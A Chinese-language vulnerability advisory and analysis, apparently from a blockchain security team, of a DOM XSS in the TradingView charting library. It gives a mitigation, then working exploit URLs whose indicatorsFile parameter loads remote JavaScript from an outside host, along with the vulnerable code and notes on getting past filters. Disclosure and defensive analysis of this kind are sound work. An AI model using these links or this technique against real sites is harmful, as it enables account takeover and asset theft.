余弦@慢雾安全团队

# 引子

慢雾区前后两位白帽黑客给我们反馈了这个 XSS 0day，第一位反馈的很早，但他自己把这个漏洞危害等级定义为低危，我们服务的交易所平台修复后，我们也没特别在意，直到第二位给我们再次提及这个 XSS。

昨天，我们开始对我们服务的所有客户下发这个预警，内容：

```
#0day 漏洞预警#
根据慢雾区匿名情报，通用 K 线展示 JS 库 TradingView 存在 XSS 0day 漏洞，可绕过 Cloudflare 等防御机制。该漏洞被利用会导致用户帐号权限被盗、恶意操作等造成资产损失。请确认是否使用到该组件，如有使用到请与我们联系。
```

当确定我们的客户修复后，我们开始对外发声，但隐去了存在漏洞的具体组件：TradingView。今天我们发现漏洞细节已经开始失控，特出此文，针对这个漏洞做个剖析。

# 防御方案

我们先给出当时我们同步给我们客户的临时快速解决方案：

```
TradingView 库 bundles 目录下有个 library 开头的 js 文件，检查这个文件是否存在漏洞代码：getScript(urlParams.indicatorsFile)

如果存在，临时解决方案可以把代码改为：getScript("")，如有问题和我们反馈。
```

聪明的前端黑只要看了防御方案就会知道怎么去构造这个利用。

# 漏洞细节

TradingView 是做 K 线展示最流行的 JS 库，在数字货币交易所、股票交易所等都有大量使用，所以影响目标很好找到。有个测试目标后，我们直接来看触发链接，随便找两个：

```
https://exchange.xxx.com/charting_library/static/tv-chart.0fe96f4607a34f9418bc.html#disabledFeatures=[]&enabledFeatures=[]&indicatorsFile=https://xssor.io/s/x.js&localserver=1&symbol=BTCUSDT&interval=1&widgetbar=%7B%22details%22%3Afalse%2C%22watchlist%22%3Afalse%2C%22watchlist_settings%22%3A%7B%22default_symbols%22%3A%5B%5D%7D%7D&timeFrames=%5B%7B%22text%22%3A%225y%22%2C%22resolution%22%3A%22W%22%7D%2C%7B%22text%22%3A%221y%22%2C%22resolution%22%3A%22W%22%7D%2C%7B%22text%22%3A%226m%22%2C%22resolution%22%3A%22120%22%7D%2C%7B%22text%22%3A%223m%22%2C%22resolution%22%3A%2260%22%7D%2C%7B%22text%22%3A%221m%22%2C%22resolution%22%3A%2230%22%7D%2C%7B%22text%22%3A%225d%22%2C%22resolution%22%3A%225%22%7D%2C%7B%22text%22%3A%221d%22%2C%22resolution%22%3A%221%22%7D%5D&locale=en&uid=tradingview_0f140&clientId=0&userId=0&chartsStorageVer=1.0&debug=false&timezone=Asia%2FShanghai

https://cn.xxx.com/lib/charting_library/charting_library/static/tv-chart.630b704a2b9d0eaf1593.html#disabledFeatures=[]&enabledFeatures=[]&indicatorsFile=https://xssor.io/s/x.js&localserver=1&symbol=coin-usdt-btc&interval=30&toolbarbg=02112C&widgetbar=%7B%22details%22%3Afalse%2C%22watchlist%22%3Afalse%2C%22watchlist_settings%22%3A%7B%22default_symbols%22%3A%5B%5D%7D%7D&drawingsAccess=%7B%22type%22%3A%22black%22%2C%22tools%22%3A%5B%7B%22name%22%3A%22Regression%20Trend%22%7D%5D%7D&timeFrames=%5B%7B%22text%22%3A%225y%22%2C%22resolution%22%3A%22W%22%7D%2C%7B%22text%22%3A%221y%22%2C%22resolution%22%3A%22W%22%7D%2C%7B%22text%22%3A%226m%22%2C%22resolution%22%3A%22120%22%7D%2C%7B%22text%22%3A%223m%22%2C%22resolution%22%3A%2260%22%7D%2C%7B%22text%22%3A%221m%22%2C%22resolution%22%3A%2230%22%7D%2C%7B%22text%22%3A%225d%22%2C%22resolution%22%3A%225%22%7D%2C%7B%22text%22%3A%221d%22%2C%22resolution%22%3A%221%22%7D%5D&locale=zh&uid=tradingview_2c0fa&clientId=0&userId=public_user_id&chartsStorageVer=1.0&customCSS=style.css&debug=false&timezone=Asia%2FShanghai
```

通过分析，触发最小简化的链接是：

```
https://cn.xxx.com/lib/charting_library/charting_library/static/tv-chart.630b704a2b9d0eaf1593.html#disabledFeatures=[]&enabledFeatures=[]&indicatorsFile=https://xssor.io/s/x.js
```

必须存在三个参数：

disabledFeatures
enabledFeatures
indicatorsFile

indicatorsFile 很好理解，而且利用逻辑非常简单，代码所在位置：TradingView 库 bundles 目录下有个 library 开头的 js 文件，触发点如下：

```JavaScript
D ? $.getScript(urlParams.indicatorsFile).done(function () {});
```

$.getScript 非常的熟悉了，在 jQuery 时代就已经实战了多次，这个函数核心代码是：


```JavaScript
xt.ajaxTransport("script", function (e) {
    if (e.crossDomain) {
        var t, n = bt.head || bt.getElementsByTagName("head")[0] || bt.documentElement;
        return {
            send: function (r, o) {
                t = bt.createElement("script"), t.async = "async", e.scriptCharset && (t.charset = e.scriptCharset), t.src = e.url, t.onload = t.onreadystatechange = function (e, r) {
                    (r || !t.readyState || /loaded|complete/.test(t.readyState)) && (t.onload = t.onreadystatechange = null, n && t.parentNode && n.removeChild(t), t = void 0, r || o(200, "success"))
                }, n.insertBefore(t, n.firstChild)
            },
            abort: function () {
                t && t.onload(0, 1)
            }
        }
    }
})
```

看代码，可以动态创建一个 script 标签对象，远程加载我们提供的 js 文件：

```
https://xssor.io/s/x.js
```

那么，另外两个参数（disabledFeatures 与 enabledFeatures）为什么是必要的？继续看代码（同样是 library 开头的那个 js 文件）：

```JavaScript
function e() {
    JSON.parse(urlParams.disabledFeatures).forEach(function (e) {
        t.setEnabled(e, !1)
    }), JSON.parse(urlParams.enabledFeatures).forEach(function (e) {
        t.setEnabled(e, !0)
    })
}

e(),
```

这段代码在触发点之前，如果没有提供合法的 disabledFeatures 及 enabledFeatures 参数格式，这段代码就会因为报错而没法继续。很容易知道，合法参数格式只要满足这两个参数是 JSON 格式即可。所以，最终利用链接是：

```
https://cn.xxx.com/lib/charting_library/charting_library/static/tv-chart.630b704a2b9d0eaf1593.html#disabledFeatures=[]&enabledFeatures=[]&indicatorsFile=https://xssor.io/s/x.js
```

# 漏洞威力

为什么我们会说这个 XSS 可以绕过 Cloudflare 等防御机制？这个“等”其实还包括了浏览器内置的 XSS 防御机制。原因很简单，因为这是一个 DOM XSS，DOM XSS 的优点是不需要经过服务端，不用面对服务端的防御机制，同时不会在服务端留下日志（除非自己特别去处理）。也正是因为这是 DOM XSS 且非常简单的触发方式，浏览器端的 XSS 防御机制也没触发。

然后这个 XSS 的触发域和目标重要业务所在的域几乎没有做什么分离操作，利用代码其实非常好写，比如直接基于 $ 里的一堆方法就可以轻易获取目标平台的目标用户隐私，甚至偷偷发起一些高级操作。

有经验的攻击者，是知道如何大批量找到目标的，然后写出漂亮的利用代码。这里就不展开了。

最后做个补充：

前端黑里，需要特别去做好的安全有：XSS、CSRF、CORS、Cookie 安全、HTTP 响应头安全、第三方 js 安全、第三方 JSON 安全、HTTPS/HSTS 安全、本地储存安全等。可以查看这篇近一步了解：

杂谈区块链生态里的前端黑
https://mp.weixin.qq.com/s/d_4gUc3Ay_He4fintNXw6Q